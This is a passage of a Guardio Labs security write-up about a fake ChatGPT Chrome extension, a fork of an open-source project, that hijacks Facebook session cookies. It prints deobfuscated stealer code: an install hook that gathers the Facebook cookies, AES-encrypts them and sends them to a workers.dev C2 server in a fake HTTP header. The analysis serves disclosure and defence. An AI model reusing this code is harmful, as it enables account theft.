---
title: “FakeGPT” #2: Open-Source Turned Malicious in Another Variant of the Facebook Account-Stealer…
url: https://medium.com/@guardiosecurity/fakegpt-2-open-source-turned-malicious-in-another-variant-of-the-facebook-account-stealer-d00ef9883d61?source=rss-6a038e71ff0f------2
source: Over Security - Cybersecurity news aggregator
date: 2023-03-23
fetch_date: 2025-10-04T10:24:14.665550
---

# “FakeGPT” #2: Open-Source Turned Malicious in Another Variant of the Facebook Account-Stealer…

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fd00ef9883d61&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40guardiosecurity%2Ffakegpt-2-open-source-turned-malicious-in-another-variant-of-the-facebook-account-stealer-d00ef9883d61&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40guardiosecurity%2Ffakegpt-2-open-source-turned-malicious-in-another-variant-of-the-facebook-account-stealer-d00ef9883d61&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

# “FakeGPT” #2: Open-Source Turned Malicious in Another Variant of the Facebook Account-Stealer Chrome Extension

[![Guardio](https://miro.medium.com/v2/resize:fill:64:64/1*s7SJaF9dODo7rWqa2rFQ6Q.png)](/%40guardiosecurity?source=post_page---byline--d00ef9883d61---------------------------------------)

[Guardio](/%40guardiosecurity?source=post_page---byline--d00ef9883d61---------------------------------------)

7 min read

·

Mar 22, 2023

--

Listen

Share

By [**Nati Tal**](https://www.linkedin.com/in/natital/)([Guardio Labs](http://www.guard.io/))

> Following our discovery of “[FakeGPT](https://labs.guard.io/fakegpt-new-variant-of-fake-chatgpt-chrome-extension-stealing-facebook-ad-accounts-with-4c9996a8f282)”, the Facebook Ad Accounts stealer masquerading as a Chat-GPT Chrome Extension, [Guardio](http://www.guard.io)’s security team uncovered another variant in a new campaign already hitting thousands a day.
> This time, it is based on an open-source product stuffed with malicious code, making the product function as expected and impossible to distinguish.
>
> Propagating since 14/03/2023 using malicious sponsored Google search results and deployed on the official Chrome Store — it is stealing Facebook session cookies and compromising accounts in masses. This follows the current trend of hijacked Facebook accounts turning into “Lily Collins” clones and bots used to promote malicious activities all around from buying likes to straight forward ISIS propagandas.
>
> In this write-up we will share our insights on this latest variant activities, how it abuses open-source as well as the effective propagation using Google services.

**Update: March 22, 2023** — Few hours after [Guardio’](http://www.guard.io/)s report to Google, the extension is now removed from the Chrome store. At the time of removal, it was stated 9000+ users installed it.

## From Open-Source to Malicious-Source

The new variant of the FakeGPT Chrome extension, titled `“Chat GPT For Google”`, is once again targeting your Facebook accounts under a cover of a ChatGPT integration for your Browser. This time, threat actors didn’t have to work hard on the look and feel of this malicious ChatGPT-themed extension — they just forked and edited a well-known open-source project that does exactly that. **From zero to “hero” in probably less than 2 minutes.**

Press enter or click to view image in full size

![]()

Left: The “FakeGPT” Variant on Chrome Store. Right: The genuine “ChatGPT for Google” extension

The genuine “ChatGPT For Google” extension is based on this [Open-Source project](https://github.com/wong2/chatgpt-google-extension), which gained popularity and millions of users in the past few months. As an open-source project, it is meant to share knowledge and contribute to the developers’ community — little did they know it will be abused so easily for malicious activity.

## A Stealer pushed with Google’s Sponsored Search

This time, the malicious extension is not pushed using sponsored Facebook posts, but rather by malicious sponsored Google search results as [we’ve seen](https://labs.guard.io/masquerads-googles-ad-words-massively-abused-by-threat-actors-targeting-organizations-gpus-42ae73ee8a1e) with many other activities lately.

And so, you search for “Chat GPT 4”, eager to test out the new algorithm, ending up clicking on a sponsored search result promising you just that. This redirects you to a landing page offering you ChatGPT right inside your search results page — all left is to install the extension from the official Chrome Store. This will give you access to ChatGPT from the search results, But will also compromise your Facebook account in an instant!

Press enter or click to view image in full size

![]()

Attack flow from Google Search to Compromised Facebook accounts

## **Encrypted Cookie-Sneaking over Fake HTTP Headers**

Based on version [1.16.6](https://github.com/wong2/chatgpt-google-extension/tree/v1.16.6/src) of the open-source project, this FakeGPT variant does only one specific malicious action, right after installation, and the rest is basically the same as the genuine code — leaving no reasons to suspect.

Press enter or click to view image in full size

![]()

The genuine ChatGPT for Google Open-Source Project page on GitHub

Looking at the `OnInstalled` handler function that is triggered once the extension is installed, we see the genuine extension just using it to make sure you see the options screen (to log in to your OpenAI account). On the other hand, the forked, turned malicious, code is exploiting this exact moment to snatch your session cookies — as we can see in this deobfuscated code sample from the malicious extension

```
Browser.runtime.onInstalled.addListener((details) => {
    details.reason === "install" &&
        (Browser.runtime.openOptionsPage(),
        Browser[qn].getAll({}).then((e) => {         // qn = 'cookies'
            let n = et(e);
            fetch("https://version.chatgpt4google.workers.dev/",
                  { method: "GET", headers: { "X-Cached-Key": xa(n, Dn) } }).then((g) => {
                g.status === 200 ? console.log(g) : console.log("Version not found");
            });
        }));});
})();
```

What we see here is straightforward Cookie-Hijacking, dedicated once again to Facebook, as can be seen in the following code snippet where the function `et()` is filtering Facebook-related cookies from the full list acquired with the Chrome Extension API. Later on, `xa()`is used to encrypt everything with AES using the key `“chatgpt4google”`:

```
// r - output of chrome.cookies.getAll({})
function et(r) {
    let e = [];
    return (
        r.forEach((n) => {
            let d = n.expirationDate ? n.expirationDate : new Date(Date.now() + 864e5);
            if (((d = Math.trunc(new Date(d).getTime() / 1e3)),
                  n.domain.indexOf("facebook") >= 0)) {
                let g = n.domain + " " + (n.hostOnly ? "FALSE" : "TRUE") + " " + n.path + " " + (n.secure ? "TRUE" : "FALSE") + " " + d + " " + n.name + " " + n.value;
                e.push(g);
            }}),e.join(``)); }

// r - filtered cookies array
// e - encryption key "chatgpt4google"
function xa(r, e) {
    return fa.default.AES.encrypt(r, e).toString();
}
```

Once the list is ready, it is sent out with a GET request to the C2 server hosted on the **workers.dev** service, the same service as we’ve seen on the original variant of FakeGPT.

The cookies list is encrypted with AES and attached to the `X-Cached-Key` HTTP header value. This technique is used here to try and sneak the cookies out without any DPI (Deep Packet Inspection) mechanisms rai...